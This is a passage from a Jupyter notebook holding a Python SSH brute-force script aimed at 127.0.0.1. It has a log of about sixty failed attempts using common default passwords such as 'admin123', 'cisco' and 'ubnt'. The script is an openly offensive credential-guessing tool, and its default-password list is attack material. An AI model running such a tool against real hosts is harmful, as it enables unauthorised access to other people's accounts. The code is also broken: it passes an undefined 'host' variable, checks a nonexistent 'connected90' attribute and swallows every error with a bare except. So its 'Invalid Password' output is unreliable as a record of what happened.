      "[O] Attmepting password(36): 'qwer1234'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(37): '1q2w3e'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(38): 'asdf1234'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(39): 'redhat'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(40): '1234qwer'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(41): 'cisco'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(42): '12qwaszx'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(43): 'test123'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(44): '1q2w3e4r5t'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(45): 'admin123'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(46): 'changeme'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(47): '1qazxsw2'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(48): '123qweasd'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(49): 'q1w2e3r4'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(50): 'letmein'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(51): 'server'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(52): 'root1234'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(53): 'master'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(54): 'abc123'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(55): 'rootroot'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(56): 'a'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(57): 'system'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(58): 'pass'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(59): '1qaz2wsx3edc'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(60): 'p@$$w0rd'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(61): '112233'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(62): 'welcome'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(63): '!QAZ2wsx'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(64): 'linux'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(65): '123321'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(66): 'manager'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(67): '1qazXSW@'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(68): 'q1w2e3r4t5'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(69): 'oracle'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(70): 'asd123'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(71): 'admin123456'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(72): 'ubnt'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(73): '123qwe'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(74): 'qazwsxedc'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(75): 'administrator'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(76): 'superuser'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(77): 'zaq12wsx'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(78): '121212'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(79): '654321'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(80): 'ubuntu'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(81): '0000'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(82): 'zxcvbnm'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(83): 'root@123'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(84): '1111'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(85): 'vmware'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(86): 'q1w2e3'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(87): 'qwerty123'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(88): 'cisco123'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(89): '11111111'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(90): 'pa55w0rd'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(91): 'asdfgh'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(92): 'notroot'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(93): '11111'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(94): '123abc'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(95): 'asdf'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(96): 'centos'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(97): '888888'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(98): '54321'!\n",
      "[X] Invalid Password!\n",
      "[O] Attmepting password(99): 'password123'!\n",
      "[X] Invalid Password!\n"
     ]
    }
   ],
   "source": [
    "hostname = \"127.0.0.1\"\n",
    "username = \"ahampriyanshu\"\n",
    "attempts = 0\n",
    "\n",
    "with open('pass.txt', 'r') as passwords:\n",
    "    for password in passwords:\n",
    "        password = password.strip(\"\\n\")\n",
    "        try:\n",
    "            print(\"[O] Attmepting password({}): '{}'!\".format(attempts, password))\n",
    "            response = ssh(host=host, user=username, password=password, timeout = 0.1)\n",
    "            if response.connected90:\n",
    "                print(\"[>] Password Found: '{}'!\".format(password))\n",
    "                response.close()\n",
    "                break\n",
    "            response.close()\n",
    "        except:\n",
    "            print(\"[X] Invalid Password!\")\n",
    "        attempts += 1\n",
    "        "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
